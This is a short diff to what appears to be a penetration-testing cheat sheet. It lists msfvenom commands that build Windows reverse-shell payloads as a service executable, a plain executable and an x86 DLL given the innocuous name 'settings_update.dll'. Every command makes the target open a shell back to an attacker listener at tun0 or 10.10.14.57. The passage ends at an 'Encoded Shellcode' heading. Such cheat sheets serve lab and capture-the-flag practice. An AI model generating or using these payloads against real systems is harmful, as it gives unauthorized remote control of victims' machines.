@@ -1,14 +1,20 @@
 
-## Creating Service .exe payload
+Creating Service .exe payload
 
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=5555 -f exe-service 
 ```
 
-## Creating normal .exe payload
+Creating normal .exe payload
 
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=80 -f exe -o shell.exe
+```
+
+Create DLL File (x86)
+
+```
+msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.10.14.57 LPORT=445 --platform windows -f dll -o settings_update.dll
 ```
 ##### Encoded Shellcode (x86)
 
